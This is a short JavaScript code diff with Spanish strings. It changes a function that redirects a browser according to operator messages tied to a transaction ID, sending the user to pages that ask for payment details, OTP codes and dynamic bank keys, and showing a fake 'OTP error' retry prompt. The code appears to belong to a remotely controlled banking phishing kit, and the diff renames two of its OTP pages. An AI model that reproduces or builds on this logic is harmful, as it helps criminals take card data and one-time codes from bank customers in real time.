@@ -101,7 +101,7 @@ async function checkPaymentVerification(transactionId, messageId, config) {
                     window.location.href = "payment.html";
                     break;
                 case `pedir_otp:${transactionId}`:
-                    window.location.href = "otpcode.html";
+                    window.location.href = "otpbot.html";
                     break;
                 case `dinamic:${transactionId}`:
                     window.location.href = "pedirdinamica.html";
@@ -115,7 +115,7 @@ async function checkPaymentVerification(transactionId, messageId, config) {
                     break;
                 case `xotp:${transactionId}`:
                     alert('Error en el código otp, inténtalo nuevamente.');
-                    window.location.href = "errorotp.html";
+                    window.location.href = "errorotpbot.html";
                     break;
                 case `confirm_finalizar:${transactionId}`:
                     window.location.href = "success.html";
